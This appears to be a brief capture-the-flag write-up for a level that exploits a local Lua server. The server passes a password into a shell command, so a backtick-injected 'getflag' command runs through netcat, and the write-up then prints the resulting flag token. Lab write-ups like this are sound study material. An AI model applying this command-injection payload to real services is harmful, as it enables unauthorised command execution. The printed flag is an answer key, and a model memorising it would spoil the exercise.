# We have a level11.lua file, let's check it
# We can see that it's connecting to a server which is 127.0.0.1 on port 5151
# prog = io.popen("echo "..pass.." | sha1sum", "r") This line looks interesting
# https://opensharing.fr/commandes-linux-sha1sum
	netcat 127.0.0.1 5151
# Then let's try to inject getflag command and put the result in a file we have the correct right access
	cd /tmp
	mkdir exploit
	chmod 777 exploit
# Type as password for the server the getflag command
# `getflag` > /tmp/exploit/token
# Token is : fa6v5ateaw21peobuub8ipe6s
